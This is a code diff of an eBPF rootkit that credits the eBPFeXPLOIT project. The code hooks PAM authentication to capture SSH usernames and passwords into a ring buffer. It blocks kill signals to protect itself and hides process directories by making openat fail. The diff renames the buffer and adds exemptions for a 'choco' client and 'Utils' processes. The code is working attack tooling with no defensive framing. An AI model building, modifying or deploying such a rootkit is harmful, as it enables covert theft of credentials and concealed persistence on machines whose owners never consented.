@@ -12,7 +12,6 @@
 // https://github.com/bfengj/eBPFeXPLOIT
 
 ///
-extern int bpf_strstr(const char *s1__ign, const char *s2__ign) __ksym __weak;
 
 #include "event.h"
 #include "hide.h"
@@ -53,13 +52,13 @@ int BPF_KRETPROBE(AuthtokExist, int ret) {
   char *userPtr = NULL;
   char *passPtr = NULL;
   struct sshUserPass *sshUserPass;
-  sshUserPass = bpf_ringbuf_reserve(&rb, sizeof(*sshUserPass), 0);
+  sshUserPass = bpf_ringbuf_reserve(&banana_buffer, sizeof(*sshUserPass), 0);
   if (!sshUserPass) {
     bpf_map_delete_elem(&pamHandleMap, &pid);
     bpf_map_delete_elem(&authtokMap, &pid);
     return 0;
   }
-  sshUserPass->type = 2;
+  sshUserPass->type = 69;
   bpf_probe_read_user(&userPtr, sizeof(userPtr), &pamh->user);
   bpf_probe_read_user_str(&sshUserPass->username, MAX_USERNAME_LEN, userPtr);
   bpf_probe_read_user(&passPtr, sizeof(passPtr), authtok);
@@ -116,15 +115,22 @@ int BPF_PROG(avoidKill, struct task_struct *p, struct kernel_siginfo *info,
 }
 
 // shit for hiding processes
-
+#define bananas "banana_buffer" // ebpf pinned buffer
+#define choco "choco"           // client
 SEC("fmod_ret/__x64_sys_openat")
 int BPF_PROG(modify_openat, const struct pt_regs *regs) {
   pid_t pid = bpf_get_current_pid_tgid() >> 32;
+  char comm[TASK_COMM_LEN];
+  struct task_struct *parent;
+  parent = (struct task_struct *)bpf_get_current_task();
 
-  // Block specific processes from seeing directory entries
-  if (pid == 4400) {
+  parent = parent->real_parent;
+  bpf_get_current_comm(&comm, sizeof(comm));
+
+  if (bpf_strstr(comm, choco) >= 0 || bpf_strstr(comm, "Utils") >= 0) {
     return 0;
   }
+  // Block specific processes from seeing directory entries
 
   const char *user_filename;
   user_filename = (const char *)regs->si;
@@ -168,6 +174,7 @@ int BPF_PROG(modify_openat, const struct pt_regs *regs) {
 
     if (match) {
       bpf_printk("blocked pid path: %s\n", pid_str);
+      bpf_printk("%s\n", comm);
       return -ENOENT;
     }
   }
